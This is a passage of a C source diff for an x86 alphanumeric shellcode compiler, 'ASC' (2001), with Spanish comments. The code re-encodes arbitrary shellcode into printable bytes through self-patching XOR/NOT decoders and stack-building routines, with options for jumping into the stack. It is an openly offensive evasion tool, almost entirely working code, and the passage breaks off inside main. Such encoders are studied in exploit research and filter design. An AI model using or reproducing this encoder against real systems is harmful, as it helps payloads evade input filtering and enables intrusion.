+/* extractores de tipo  (0=higher 3=lower) */
+#define BYTE(d,n) ((d>>(n*8))&0xFF) /* obtener n(0-3) byte desde (d)word d */
+
+
+/* definiciones de instrucciones alfanumericas de IA32 */
+/* =================================================== */
+
+#define DB(s,b) shellcode_db(s,b);
+
+/* dw b1 b2 */
+#define DW(s,w)  \
+ DB(s,BYTE(w,0)) \
+ DB(s,BYTE(w,1)) \
+
+/* dd b1 b2 b3 b4 */
+#define DD(s,d)  \
+ DB(s,BYTE(d,0)) \
+ DB(s,BYTE(d,1)) \
+ DB(s,BYTE(d,2)) \
+ DB(s,BYTE(d,3)) \
+
+#define XOR_ECX_DH(s) \
+ DB(s,'0')            \
+ DB(s,'1')            \
+
+#define XOR_ECX_BH(s) \
+ DB(s,'0')            \
+ DB(s,'9')            \
+
+#define XOR_ECX_ESI(s) \
+ DB(s,'1')             \
+ DB(s,'1')             \
+
+#define XOR_ECX_EDI(s) \
+ DB(s,'1')             \
+ DB(s,'9')             \
+
+// xor [base+2*index+disp8],r8
+#define XORsib8(s,base,index,disp8,r8) \
+ DB(s,'0')                             \
+ DB(s,(01<<6|r8   <<3|4   ))           \
+ DB(s,(01<<6|index<<3|base))           \
+ DB(s,disp8)                           \
+
+// xor [base+2*index+disp8],r32
+#define XORsib32(s,base,index,disp8,r32) \
+ DB(s,'1')                               \
+ DB(s,(01<<6|r32  <<3|4   ))             \
+ DB(s,(01<<6|index<<3|base))             \
+ DB(s,disp8)                             \
+
+#define XOR_AL(s,b) \
+ DB(s,'4')          \
+ DB(s,b)            \
+
+#define XOR_AX(s,w) \
+ O16(s)             \
+ DB(s,'5')          \
+ DW(s,w)            \
+
+#define XOR_EAX(s,d) \
+ DB(s,'5')           \
+ DD(s,d)             \
+
+#define INCr(s,r) DB(s,('A'-1)|r)
+#define DECr(s,r) DB(s,'H'|r)
+#define PUSHr(s,r) DB(s,'P'|r)
+#define POPr(s,r) DB(s,'X'|r)
+#define POPAD(s) DB(s,'a')
+#define O16(s) DB(s,'f')
+
+#define PUSHd(s,d) \
+ DB(s,'h')         \
+ DD(s,d)           \
+
+#define PUSHw(s,w) \
+ O16(s)            \
+ DB(s,'h')         \
+ DW(s,w)           \
+
+#define PUSHb(s,b) \
+ DB(s,'j')         \
+ DB(s,b)           \
+
+#define INT3(s) \
+ DB(s,'\xCC')   \
+
+#define CALL_ESP(s) \
+ DB(s,'\xFF')       \
+ DB(s,'\xD4')       \
+
+#define JMP_ESP(s) \
+ DB(s,'\xFF')      \
+ DB(s,'\xE4')      \
+
+#define RET(s) \
+ DB(s,'\xC3')  \
+
+/* +------------------------------------------------------------------------+ */
+/* |               MANIPULACIONES ALFANUMERICAS DE FUNCIONES                | */
+/* +------------------------------------------------------------------------+ */
+
+#define ALPHANUMERIC_BYTES "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMOPQRSTUVWXYZ"
+
+/* devolver 1 si el byte es alfanumerico */
+/* ===================================== */
+int alphanumeric_check(unsigned char c) {
+ if (c<'0') return 0;
+ else if (c<='9') return 1;
+ else if (c<'A') return 0;
+ else if (c<='Z') return 1;
+ else if (c<'a') return 0;
+ else if (c<='z') return 1;
+ else return 0;
+}
+
+
+/* devolver un byte random alfanumerico */
+/* ==================================== */
+unsigned char alphanumeric_get_byte() {
+ unsigned char *bytes=ALPHANUMERIC_BYTES;
+
+ return bytes[random_get_int(strlen(bytes))];
+}
+
+
+/* devolver un byte random alfanumerico b (c=CATEGORY_XOR,(b XOR(b XOR c))) */
+/* ======================================================================== */
+unsigned char alphanumeric_get_complement(unsigned char c) {
+ unsigned char ret;
+
+ while (1) {
+  ret=alphanumeric_get_byte();
+  if (alphanumeric_check(XOR(c,ret))) return ret;
+ }
+}
+
+/* +------------------------------------------------------------------------+ */
+/* |               FUNCIONES DE MANIPULACIONES DE REGISTROS                 | */
+/* +------------------------------------------------------------------------+ */
+
+/* devolver un registro random en un set de registros permitidos */
+/* ============================================================= */
+#define M_EAX (1<<EAX)
+#define M_EBX (1<<EBX)
+#define M_ECX (1<<ECX)
+#define M_EDX (1<<EDX)
+#define M_ESI (1<<ESI)
+#define M_EDI (1<<EDI)
+#define M_ESP (1<<ESP)
+#define M_EBP (1<<EBP)
+#define M_REGISTERS (M_EAX|M_EBX|M_ECX|M_EDX|M_ESI|M_EDI|M_ESP|M_EBP)
+
+int alphanumeric_get_register(int mask) {
+ int regs[REGISTERS];
+ int size,i;
+
+ size=0;
+ for (i=0;i<REGISTERS;i++) { /* para todos los registros posibles */
+  if (mask&(1<<i)) regs[size++]=i; /* agregar el registro si esta en nuestra
+ }                                    mascara */
+ return regs[random_get_int(size)];
+}
+
+
+/* devolver un registro "POPable" (ECX|EDX) con la direccion base del shellcode usando la direccion de retorno en la pila */
+/* ====================================================================================================================== */
+int alphanumeric_get_address_stack(struct Sshellcode *s) {
+ unsigned char ret;
+
+ if (s==NULL) return -1;
+
+ DECr(s,ESP); /* dec esp */
+ DECr(s,ESP); /* dec esp */
+ DECr(s,ESP); /* dec esp */
+ DECr(s,ESP); /* dec esp */
+ ret=alphanumeric_get_register(M_ECX|M_EDX); /* obtener un registro random */
+ POPr(s,ret); /* pop ecx/edx =>pop el valor de retorno desde la pila */
+ return ret;
+}
+
+
+/* inicializar registros (direccion base de reg=shellcode) */
+/* ======================================================= */
+int alphanumeric_initialize_registers(struct Sshellcode *s,unsigned char reg) {
+ unsigned char b[4];
+ int i;
+
+ if (s==NULL) return -1;
+
+ if (reg==EAX) {
+  PUSHr(s,EAX);                                   /* push eax =>address */
+  reg=alphanumeric_get_register(M_ECX|M_EDX); /* obtener un registro random */
+  POPr(s,reg);                                    /* pop ecx/edx */
+ }
+ for (i=0;i<4;i++) b[i]=alphanumeric_get_byte(); /* obtener un dword random alfanumerico */
+ PUSHd(s,DWORD(b[0],b[1],b[2],b[3]));             /* push '????' */
+ POPr(s,EAX);                                     /* pop eax */ 
+ XOR_EAX(s,DWORD(b[0],b[1],b[2],b[3]));           /* xor eax,'????' =>EAX=0 */
+ DECr(s,EAX);                                     /* dec eax  =>EAX=FFFFFFFF */
+ PUSHr(s,alphanumeric_get_register(M_REGISTERS)); /* push r32 =>EAX */
+ PUSHr(s,alphanumeric_get_register(M_REGISTERS)); /* push r32 =>ECX */
+ PUSHr(s,EAX);                                    /* push eax =>EDX=FFFFFFFF */
+ PUSHr(s,EAX);                                    /* push eax =>EBX=FFFFFFFF */
+ PUSHr(s,alphanumeric_get_register(M_REGISTERS)); /* push r32 =>ESP */
+ PUSHr(s,reg);                                    /* push reg =>EBP=address */
+ PUSHr(s,EAX);                                    /* push eax =>ESI=FFFFFFFF */
+ PUSHr(s,EAX);                                    /* push eax =>EDI=FFFFFFFF */
+ POPAD(s);                                        /* popad */
+ return 0;
+}
+
+/* +------------------------------------------------------------------------+ */
+/* |                   FUNCIONES DE MANIPULACION DE STACK                   | */
+/* +------------------------------------------------------------------------+ */
+
+/* devolver la categoria del byte */
+/* ============================== */
+#define CATEGORY_NULL 0
+#define CATEGORY_00 1
+#define CATEGORY_FF 2
+#define CATEGORY_ALPHA 3
+#define CATEGORY_ALPHA_NOT 4
+#define CATEGORY_XOR 5
+#define CATEGORY_XOR_NOT 6
+
+int alphanumeric_stack_get_category(unsigned char c) {
+ if (c==0) return CATEGORY_00;
+ else if (c==0xFF) return CATEGORY_FF;
+ else if (alphanumeric_check(c)) return CATEGORY_ALPHA;
+ else if (c<0x80) return CATEGORY_XOR;
+ else { /* necesita un NOT */
+  c=NOT(c);
+  if (alphanumeric_check(c)) return CATEGORY_ALPHA_NOT;
+  else return CATEGORY_XOR_NOT;
+ }
+}
+
+
+/* hacer un NOT en 1,2,3 o 4 bytes en la pila */
+/* =========================================== */
+int alphanumeric_stack_generate_not(struct Sshellcode *s,int size) {
+ if (s==NULL) return -1;
+
+ PUSHr(s,ESP); /* push esp */
+ POPr(s,ECX);  /* pop ecx */
+
+ switch(size) {
+ case 1:
+  if (alphanumeric_get_register(M_EDX|M_EBX)==EDX) {
+   XOR_ECX_DH(s); /* xor [ecx],dh */
+  }
+  else {
+   XOR_ECX_BH(s); /* xor [ecx],bh */
+  }
+  break;
+
+ case 2:
+  if (alphanumeric_get_register(M_ESI|M_EDI)==ESI) {
+   O16(s);XOR_ECX_ESI(s); /* xor [ecx],si */
+  }
+  else {
+   O16(s);XOR_ECX_EDI(s); /* xor [ecx],di */
+  }
+  break;
+
+ case 3:
+  DECr(s,ECX);     /* dec ecx */
+ case 4:
+  if (alphanumeric_get_register(M_ESI|M_EDI)==ESI) {
+   XOR_ECX_ESI(s); /* xor [ecx],esi */
+  }
+  else {
+   XOR_ECX_EDI(s); /* xor [ecx],edi */
+  }
+  break;
+ }
+ return 0;
+}
+
+
+/* generar 1,2,3 o 4 bytes desde una categoria en la pila */
+/* ====================================================== */
+#define SB1 b[size-1]
+#define SB2 b[size-2]
+#define SB3 b[size-3]
+#define SB4 b[size-4]
+
+int alphanumeric_stack_generate_push(struct Sshellcode *s,int category,unsigned char *bytes,int size) {
+ int reg,i;
+ unsigned char b[4];
+ unsigned char xSB1,xSB2,xSB3,xSB4;
+
+ if (s==NULL) return -1;
+
+ memcpy(b,bytes,4);
+
+ /* posiblemente realice un NOT en b[] */
+ if ((category==CATEGORY_ALPHA_NOT)||(category==CATEGORY_XOR_NOT)) {
+  for (i=0;i<size;i++) b[i]=NOT(b[i]);
+ }
+
+ /* genera bytes en la pila */
+ switch(category) {
+ case CATEGORY_00:
+ case CATEGORY_FF:
+  reg=alphanumeric_get_register(M_EDX|M_EBX|M_ESI|M_EDI);
+  if (category==CATEGORY_00) INCr(s,reg); /* inc r16 =>r16=0*/
+  switch(size) {
+  case 1:
+   O16(s);PUSHr(s,reg); /* push r16 */
+   INCr(s,ESP);         /* inc esp */
+   break;
+  case 2:
+   O16(s);PUSHr(s,reg); /* push r16 */
+   break;
+  case 3:
+   PUSHr(s,reg); /* push r32 */
+   INCr(s,ESP);  /* inc esp */
+   break;
+  case 4:
+   PUSHr(s,reg); /* push r32 */
+   break;
+  }
+  if (category==CATEGORY_00) DECr(s,reg); /* dec r16 =>r16=FFFFFFFF */
+  break;
+
+ case CATEGORY_ALPHA:
+ case CATEGORY_ALPHA_NOT:
+  switch(size) {
+  case 1:
+   PUSHw(s,WORD(SB1,alphanumeric_get_byte())); /* push SB1 */
+   INCr(s,ESP);                                /* inc esp */
+   break;
+  case 2:
+   PUSHw(s,WORD(SB1,SB2)); /* push SB1 SB2 */
+   break;
+  case 3:
+   PUSHd(s,DWORD(SB1,SB2,SB3,alphanumeric_get_byte())); /* push SB1 SB2 SB3 */
+   INCr(s,ESP);                                         /* inc esp */
+   break;
+  case 4:
+   PUSHd(s,DWORD(SB1,SB2,SB3,SB4)); /* push SB1 SB2 SB3 SB4 */
+   break;
+  }
+  break;
+
+ case CATEGORY_XOR:
+ case CATEGORY_XOR_NOT:
+  switch(size) {
+  case 1:
+   xSB1=alphanumeric_get_complement(SB1);
+   PUSHw(s,WORD(XOR(SB1,xSB1),alphanumeric_get_byte())); /* push ~xSB1 */
+   O16(s);POPr(s,EAX);                           /* pop ax */
+   XOR_AX(s,WORD(xSB1,alphanumeric_get_byte())); /* xor ax,xSB1 =>EAX=SB1 */
+   O16(s);PUSHr(s,EAX);                          /* push ax */
+   INCr(s,ESP);                                  /* inc esp */
+   break;
+  case 2:
+   xSB1=alphanumeric_get_complement(SB1);
+   xSB2=alphanumeric_get_complement(SB2);
+   PUSHw(s,WORD(XOR(SB1,xSB1),XOR(SB2,xSB2))); /* push ~xSB1 ~xSB2 */
+   O16(s);POPr(s,EAX);        /* pop ax */
+   XOR_AX(s,WORD(xSB1,xSB2)); /* xor ax,xSB1 xSB2 =>EAX=SB1 SB2 */
+   O16(s);PUSHr(s,EAX);       /* push ax */
+   break;
+  case 3:
+   xSB1=alphanumeric_get_complement(SB1);
+   xSB2=alphanumeric_get_complement(SB2);
+   xSB3=alphanumeric_get_complement(SB3);
+   PUSHd(s,DWORD(XOR(SB1,xSB1),XOR(SB2,xSB2),XOR(SB3,xSB3),alphanumeric_get_byte())); /* push ~xSB1 ~xSB2 ~xSB3 */
+   POPr(s,EAX);                                              /* pop eax */
+   XOR_EAX(s,DWORD(xSB1,xSB2,xSB3,alphanumeric_get_byte())); /* xor eax,xSB1 xSB2 xSB3 =>EAX=SB1 SB2 SB3 */
+   PUSHr(s,EAX);                                             /* push eax */
+   INCr(s,ESP);                                              /* inc esp */
+   break;
+  case 4:
+   xSB1=alphanumeric_get_complement(SB1);
+   xSB2=alphanumeric_get_complement(SB2);
+   xSB3=alphanumeric_get_complement(SB3);
+   xSB4=alphanumeric_get_complement(SB4);
+   PUSHd(s,DWORD(XOR(SB1,xSB1),XOR(SB2,xSB2),XOR(SB3,xSB3),XOR(SB4,xSB4))); /* push ~xSB1 ~xSB2 ~xSB3 ~xSB4 */
+   POPr(s,EAX);                           /* pop eax */
+   XOR_EAX(s,DWORD(xSB1,xSB2,xSB3,xSB4)); /* xor eax,xSB1 xSB2 xSB3 xSB4 =>EAX=SB1 SB2 SB3 SB4 */
+   PUSHr(s,EAX);                          /* push eax */
+   break;
+  }
+  break;
+ }
+
+ /* posiblemente realice un NOT en la pila */
+ if ((category==CATEGORY_ALPHA_NOT)||(category==CATEGORY_XOR_NOT)) alphanumeric_stack_generate_not(s,size);
+
+ return 0;
+}
+
+
+/* generar el shellcode original en la pila */
+/* ======================================== */
+int alphanumeric_stack_generate(struct Sshellcode *output,struct Sshellcode *input) {
+ int category,size,i;
+
+ if (input==NULL) return -1;
+ if (output==NULL) return -1;
+
+ i=input->size-1;
+ while (i>=0) { /* loop desde la derecha hacia la izquierda del shellcode original */
+  category=alphanumeric_stack_get_category(input->opcodes[i]);
+  size=1; /* por defecto, tenemos 1 byte de la misma categoria */
+
+  /* loop hasta 3 bytes maximos previos son de la misma categoria */
+  while ((i-size>=0)&&(size<4)&&(alphanumeric_stack_get_category(input->opcodes[i-size])==category)) size++;
+
+  /* escribir esos bytes en la pila */
+  alphanumeric_stack_generate_push(output,category,&input->opcodes[i-size+1],size);
+
+  i-=size;
+ }
+ return 0;
+}
+
+/* +------------------------------------------------------------------------+ */
+/* |                 FUNCIONES DE MANIPULACIONES DE PATCHES                 | */
+/* +------------------------------------------------------------------------+ */
+
+/* devolver la categoria del byte */
+/* ============================== */
+int alphanumeric_patches_get_category(unsigned char c) {
+ if (alphanumeric_check(c)) return CATEGORY_ALPHA;
+ else if (c<0x80) return CATEGORY_XOR;
+ else { /* necesita un NOT */
+  c=NOT(c);
+  if (alphanumeric_check(c)) return CATEGORY_ALPHA_NOT;
+  else return CATEGORY_XOR_NOT;
+ }
+}
+
+
+/* generar el shellcode de inicializacion de patches */
+/* ================================================= */
+int alphanumeric_patches_generate_initialization(struct Sshellcode *shellcode,int patcher_size,int alpha_begin,int base,unsigned char disp8) {
+ struct Sshellcode *s;
+ int offset; /* offset real para el shellcode original a patchear */
+ struct Sshellcode *p_offset; /* offset "shellcode" */
+ int fill_size; /* tama~o a agregar al shellcode de para alinear */
+ int initialization_size,i;
+
+ if (shellcode==NULL) return -1;
+
+ initialization_size=0;
+ while(1) { /* loop hasta que creamos un shellcode de inicializacion valido */
+  s=shellcode_malloc();
+  fill_size=0;
+
+  PUSHr(s,alphanumeric_get_register(M_REGISTERS));  /* push r32 =>EAX */
+  PUSHr(s,alphanumeric_get_register(M_REGISTERS));  /* push r32 =>ECX */
+  PUSHr(s,alphanumeric_get_register(M_EDX|M_EBX|M_ESI|M_EDI)); /* push FFFFFFFF =>EDX */
+  if (base==EBX) {
+   PUSHr(s,EBP);                                    /* push ebp =>EBX */
+  }
+  else {
+   PUSHr(s,alphanumeric_get_register(M_REGISTERS)); /* push r32 =>EBX */
+  }
+  PUSHr(s,alphanumeric_get_register(M_REGISTERS));  /* push r32 =>ESP */
+
+  offset=shellcode->size+initialization_size+patcher_size+alpha_begin-disp8; /* calculate the real offset */
+
+  /* si el offset no es correcto debemos modficar el tama~o de nuestro shellcode de initializacion */
+  if (offset<0) { /* alinear para tener un offset positivo */
+   fill_size=-offset;
+   offset=0;
+  }
+  if (offset&1) { /* alinear para el 2*ebp */
+   fill_size++;
+   offset++;
+  }
+  offset/=2;
+
+  p_offset=shellcode_malloc();
+  DB(p_offset,BYTE(offset,0));
+  DB(p_offset,BYTE(offset,1));
+  DB(p_offset,BYTE(offset,2));
+  DB(p_offset,BYTE(offset,3));
+  alphanumeric_stack_generate(s,p_offset);          /* push offset => EBP */
+  shellcode_free(p_offset);
+
+  PUSHr(s,alphanumeric_get_register(M_EDX|M_EBX|M_ESI|M_EDI)); /* push FFFFFFFF =>ESI */
+  if (base==EDI) {
+   PUSHr(s,EBP);                                    /* push ebp =>EDI */
+  }
+  else {
+   PUSHr(s,alphanumeric_get_register(M_REGISTERS)); /* push r32 =>EDI */
+  }
+  POPAD(s);                                         /* popad */
+
+  if (s->size<=initialization_size) break; /* si el offset es bueno */
+
+  initialization_size++;
+ }
+ /* el offset es bueno */
+
+ /* llenar para alcanzar el valor initialization_size */
+ while (s->size<initialization_size) INCr(s,ECX);
+ /* llenar para alcanzar el valor del offset */
+ for (i=0;i<fill_size;i++) INCr(s,ECX);
+
+ shellcode_cat(shellcode,s);
+ shellcode_free(s);
+ return 0;
+}
+
+
+/* generar el xor patch */
+/* ==================== */
+#define PB1 bytes[0]
+#define PB2 bytes[1]
+#define PB3 bytes[2]
+#define PB4 bytes[3]
+
+int alphanumeric_patches_generate_xor(struct Sshellcode *s,int category,unsigned char *bytes,int size,int base,char disp8) {
+ unsigned char xPB1,xPB2,xPB3,xPB4;
+ int reg,i;
+
+ if (s==NULL) return -1;
+
+ /* eventualmente realizar un NOT en bytes[] */
+ if ((category==CATEGORY_ALPHA_NOT)||(category==CATEGORY_XOR_NOT)) {
+  for (i=0;i<size;i++) bytes[i]=NOT(bytes[i]);
+ }
+
+  /* generar los bytes en el shellcode original */
+ switch(category) {
+ case CATEGORY_ALPHA:
+ case CATEGORY_ALPHA_NOT:
+  /* nada por hacer */
+  break;
+ case CATEGORY_XOR:
+ case CATEGORY_XOR_NOT:
+  reg=alphanumeric_get_register(M_EAX|M_ECX);
+  switch(size) {
+  case 1:
+   xPB1=alphanumeric_get_complement(PB1);
+   PUSHb(s,XOR(PB1,xPB1));        /* push ~xPB1 */
+   POPr(s,reg);                   /* pop reg */
+   PB1=xPB1;                      /* modificar dentro del shellcode original */
+   XORsib8(s,base,EBP,disp8,reg); /* xor [base+2*ebp+disp8],reg => xor xPB1,~xPB1 */
+   break;
+  case 2:
+   xPB1=alphanumeric_get_complement(PB1);
+   xPB2=alphanumeric_get_complement(PB2);
+   PUSHw(s,WORD(XOR(PB2,xPB2),XOR(PB1,xPB1))); /* push ~xPB2 ~xPB1 */
+   O16(s);POPr(s,reg); /* pop reg */
+   PB1=xPB1;           /* modificar dentro del shellcode original */
+   PB2=xPB2;
+   O16(s);XORsib32(s,base,EBP,disp8,reg); /* xor [base+2*ebp+disp8],reg => xor xPB2 xPB1,~xPB2 ~xPB1 */
+   break;
+  case 4:
+   xPB1=alphanumeric_get_complement(PB1);
+   xPB2=alphanumeric_get_complement(PB2);
+   xPB3=alphanumeric_get_complement(PB3);
+   xPB4=alphanumeric_get_complement(PB4);
+   PUSHd(s,DWORD(XOR(PB4,xPB4),XOR(PB3,xPB3),XOR(PB2,xPB2),XOR(PB1,xPB1))); /* push ~xPB4 ~xPB3 ~xPB2 ~xPB1 */
+   POPr(s,reg); /* pop reg */
+   PB1=xPB1;    /* modificar dentro del shellcode original */
+   PB2=xPB2;
+   PB3=xPB3;
+   PB4=xPB4;
+   XORsib32(s,base,EBP,disp8,reg); /* xor [base+2*ebp+disp8],reg => xor xPB4 xPB3 xPB2 xPB1,~xPB4 ~xPB3 ~xPB2 ~xPB1 */
+   break;
+  }
+  break;
+ }
+
+ /* eventualmente realizar un NOT en el shellcode */
+ if ((category==CATEGORY_ALPHA_NOT)||(category==CATEGORY_XOR_NOT)) {
+  reg=alphanumeric_get_register(M_EDX|M_ESI);
+  switch(size) {
+  case 1:
+   XORsib8(s,base,EBP,disp8,reg); /* xor [base+2*ebp+disp8],dl/dh */
+   break;
+  case 2:
+   O16(s);XORsib32(s,base,EBP,disp8,reg); /* xor [base+2*ebp+disp8],dx/si */
+   break;
+  case 4:
+   XORsib32(s,base,EBP,disp8,reg); /* xor [base+2*ebp+disp8],edx/esi */
+   break;
+  }
+ }
+
+ return 0;
+}
+
+
+/* generar el patch y el shellcode original */
+/* ======================================== */
+int alphanumeric_patches_generate(struct Sshellcode *output,struct Sshellcode *input) {
+ struct Sshellcode *out,*in; /* codigos input y output */
+ struct Sshellcode *best; /* ultimo mejor shellcode */
+ struct Sshellcode *patcher; /* codigo de patches */
+ int alpha_begin,alpha_end; /* offsets de la parte patcheable */
+ int base; /* base register */
+ unsigned char *disp8_begin; /* puntero al actual primer disp8 */
+ unsigned char disp8;
+ int category,size,i,j;
+
+ if (input==NULL) return -1;
+ if (output==NULL) return -1;
+
+ /* obtener el offset de los primeros y ultimos bytes no alfanumericos */
+ for (alpha_begin=0;alpha_begin<input->size;alpha_begin++) {
+  if (!alphanumeric_check(input->opcodes[alpha_begin])) break;
+ }
+ if (alpha_begin>=input->size) { /* si el patching no es necesitado */
+  shellcode_cat(output,input);
+  return 0;
+ }
+ for (alpha_end=input->size-1;alpha_end>alpha_begin;alpha_end--) {
+  if (!alphanumeric_check(input->opcodes[alpha_end])) break;
+ }
+
+ base=alphanumeric_get_register(M_EBX|M_EDI);
+ best=shellcode_malloc();
+ disp8_begin=ALPHANUMERIC_BYTES;
+
+ while (*disp8_begin!=0) { /* loop para todos los posibles valores disp8 */
+  disp8=*disp8_begin;
+
+  /* asignar todos los shellcodes */
+  out=shellcode_malloc();
+  shellcode_cpy(out,output);
+  in=shellcode_malloc();
+  shellcode_cpy(in,input);
+  patcher=shellcode_malloc();
+
+  i=alpha_begin;
+  size=0;
+  while (i<=alpha_end) { /* loop dentro de nuestro shellcode original */
+   /* incrementar el offset si es necesitado */
+   for (j=0;j<size;j++) {
+    if (alphanumeric_check(disp8+1)) {
+     disp8++;
+    }
+    else INCr(patcher,base); /* inc base */
+   }
+
+   category=alphanumeric_patches_get_category(in->opcodes[i]);
+   size=1; /* por defecto, tenemos 1 byte de la misma categoria */
+
+   /* loop hasta los 3 bytes maximos siguientes son de la misma categoria */
+   while ((i+size<=alpha_end)&&(size<4)&&(alphanumeric_patches_get_category(in->opcodes[i+size])==category)) size++;
+   if (size==3) size=2; /* impossible to XOR 3 bytes */
+
+   /* patchear esos bytes */
+   alphanumeric_patches_generate_xor(patcher,category,&in->opcodes[i],size,base,disp8);
+
+   i+=size;
+  }
+
+  alphanumeric_patches_generate_initialization(out,patcher->size,alpha_begin,base,*disp8_begin); /* create a valid initialization shellcode */
+
+  shellcode_cat(out,patcher);
+  shellcode_cat(out,in);
+
+  if ((best->size==0)||(out->size<best->size)) shellcode_cpy(best,out); /* if this is a more interesting shellcode, we save it */
+
+  /* liberar todos los shellcodes y malloc */
+  shellcode_free(out);
+  shellcode_free(in);
+  shellcode_free(patcher);
+  disp8_begin++;
+ }
+
+ shellcode_cpy(output,best);
+ shellcode_free(best);
+ return 0;
+}
+
+/******************************************************************************/
+
+/* +------------------------------------------------------------------------+ */
+/* |                       FUNCIONES DE INTERFACE                           | */
+/* +------------------------------------------------------------------------+ */
+
+void print_syntax() {
+ fprintf(stderr,"ASC - IA32 Alphanumeric Shellcode Compiler\n");
+ fprintf(stderr,"==========================================\n");
+ fprintf(stderr,"SYNTAX  : asc [options] <input file[.c]>\n");
+ fprintf(stderr,"COMPILATION OPTIONS :\n");
+ fprintf(stderr," -a[ddress] stack|<r32>     : address of shellcode (default=stack)\n");
+ fprintf(stderr," -m[ode] stack|patches      : output shellcode build mode (default=patches)\n");
+ fprintf(stderr," -s[tack] call|jmp|null|ret : method to return to original code on the stack\n");
+ fprintf(stderr,"                              (default=null)\n");
+ fprintf(stderr,"DEBUGGING OPTIONS :\n");
+ fprintf(stderr," -debug-start               : breakpoint to start of compiled shellcode\n");
+ fprintf(stderr," -debug-build-original      : breakpoint to building of original shellcode\n");
+ fprintf(stderr," -debug-build-jump          : breakpoint to building of stack jump code\n");
+ fprintf(stderr," -debug-jump                : breakpoint to stack jump\n");
+ fprintf(stderr," -debug-original            : breakpoint to start of original shellcode\n");
+ fprintf(stderr,"INPUT/OUTPUT OPTIONS :\n");
+ fprintf(stderr," -c[har] <char[] name>      : name of C input array (default=first array)\n");
+ fprintf(stderr," -f[ormat] bin|c            : output file format (default=bin)\n");
+ fprintf(stderr," -o[utput] <output file>    : output file name (default=stdout)\n");
+
+
+
+ fprintf(stderr,"\n");
+ fprintf(stderr,"ASC 0.9.1                                                    rix@hert.org @2001\n");
+ exit(1);
+}
+
+
+void print_error() {
+ perror("Error ASC");
+ exit(1);
+};
+
+/* +------------------------------------------------------------------------+ */
+/* |                        PROGRAMA PRINCIPAL                              | */
+/* +------------------------------------------------------------------------+ */
+
+#define STACK REGISTERS+1
+
+#define INPUT_FORMAT_BIN 0
+#define INPUT_FORMAT_C 1
+
+#define OUTPUT_FORMAT_BIN 0
+#define OUTPUT_FORMAT_C 1
+
+#define OUTPUT_MODE_STACK 0
+#define OUTPUT_MODE_PATCHES 1
+
+#define STACK_MODE_CALL 0
+#define STACK_MODE_JMP 1
+#define STACK_MODE_NULL 2
+#define STACK_MODE_RET 3
+
+
+int main(int argc, char **argv) {
+ char *input_filename=NULL,*output_filename=NULL;
+ struct Sshellcode *input=NULL,*output=NULL,*stack=NULL;
+
+ char input_format=INPUT_FORMAT_BIN;
+ char *input_variable=NULL;
+ char address=STACK;
+ char output_format=OUTPUT_FORMAT_BIN;
+ char output_mode=OUTPUT_MODE_PATCHES;
+ char stack_mode=STACK_MODE_NULL;
+
+ int debug_start=0;
+ int debug_build_original=0;
+ int debug_build_jump=0;
+ int debug_jump=0;
+ int debug_original=0;
+
+ int ret,l;
+
+
+ /* definicion de parametros de linea de comandos */
+ #define SHORT_OPTIONS "a:c:f:m:o:s:"
+ struct option long_options[]={
+  /* {"name",has_arg,&variable,value} */
+  {"address",1,NULL,'a'},
+  {"mode",1,NULL,'m'},
+  {"stack",1,NULL,'s'},
+
+  {"debug-start",0,&debug_start,1},
+  {"debug-build-original",0,&debug_build_original,1},
+  {"debug-build-jump",0,&debug_build_jump,1},
+  {"debug-jump",0,&debug_jump,1},
+  {"debug-original",0,&debug_original,1},
+
+  {"char",1,NULL,'c'},
+  {"format",1,NULL,'f'},
+  {"output",1,NULL,'o'},
+
+  {0,0,0,0}
+ };
+ int c;
+ int option_index=0;
+
+
+ /* leer los parametros de linea de comandos */
+ opterr=0;
+ while ((c=getopt_long_only(argc,argv,SHORT_OPTIONS,long_options,&option_index))!=-1) {
+  switch (c) {
+  case 'a':
+   if (!strcmp(optarg,"eax")) address=EAX;
+   else if (!strcmp(optarg,"ebx")) address=EBX;
+   else if (!strcmp(optarg,"ecx")) address=ECX;
+   else if (!strcmp(optarg,"edx")) address=EDX;
+   else if (!strcmp(optarg,"esp")) address=ESP;
+   else if (!strcmp(optarg,"ebp")) address=EBP;
+   else if (!strcmp(optarg,"esi")) address=ESI;
+   else if (!strcmp(optarg,"edi")) address=EDI;
+   else if (!strcmp(optarg,"stack")) address=STACK;
+   else print_syntax();
+   break;
+  case 'c':
+   input_format=INPUT_FORMAT_C;
+   input_variable=optarg;
+   break;
+  case 'f':
+   if (!strcmp(optarg,"bin")) output_format=OUTPUT_FORMAT_BIN;
+   else if (!strcmp(optarg,"c")) output_format=OUTPUT_FORMAT_C;
+   else print_syntax();
+   break;
+  case 'm':
+   if (!strcmp(optarg,"stack")) output_mode=OUTPUT_MODE_STACK;
+   else if (!strcmp(optarg,"patches")) output_mode=OUTPUT_MODE_PATCHES;
+   else print_syntax();
+   break;
+  case 'o':
+   output_filename=optarg;
+   break;
+  case 's':
+   output_mode=OUTPUT_MODE_STACK;
+   if (!strcmp(optarg,"call")) stack_mode=STACK_MODE_CALL;
+   else if (!strcmp(optarg,"jmp")) stack_mode=STACK_MODE_JMP;
+   else if (!strcmp(optarg,"null")) stack_mode=STACK_MODE_NULL;
+   else if (!strcmp(optarg,"ret")) stack_mode=STACK_MODE_RET;
+   else print_syntax();
+   break;
+  case 0: /* variable set de opcion larga */
+   break;
+  case '?': /* caracter de error de opcion */
+  case ':': /* parametro de error de opcion */
+  default:
+   print_syntax();
+  }
+ }
+
+ if (optind+1!=argc) print_syntax(); /* si no hay especificado un archivo input */
+ input_filename=argv[optind];
+ /* detectar el formato de archivo input */
+ l=strlen(input_filename);
+ if ((l>2)&&(input_filename[l-2]=='.')&&(input_filename[l-1]=='c')) input_format=INPUT_FORMAT_C;
+
+ random_initialize();
+ input=shellcode_malloc();
+ output=shellcode_malloc();
+
+
+ /* leer el archivo input */
+ if (debug_original) INT3(input);
+ fprintf(stderr,"Reading %s ... ",input_filename);
+
+ switch(input_format) {
+ case INPUT_FORMAT_BIN:
+  ret=shellcode_read_binary(input,input_filename);
+  break;
+ case INPUT_FORMAT_C:
+  ret=shellcode_read_C(input,input_filename,input_variable);
+  break;
+ }
+ if (ret==-1) {
+  fprintf(stderr,"\n");
+  print_error();
+ }
+ if (!debug_original) fprintf(stderr,"(%d bytes)\n",input->size);
+ else fprintf(stderr,"(%d bytes)\n",input->size-1);
+
+
+ if (debug_start) INT3(output);
+
+ /* obtener la direccion del shellcode */
+ if (address==STACK) address=alphanumeric_get_address_stack(output);
+ alphanumeric_initialize_registers(output,address);
+
+ /* generar el shellcode original */
+ if (debug_build_original) INT3(output);
+ switch(output_mode) {
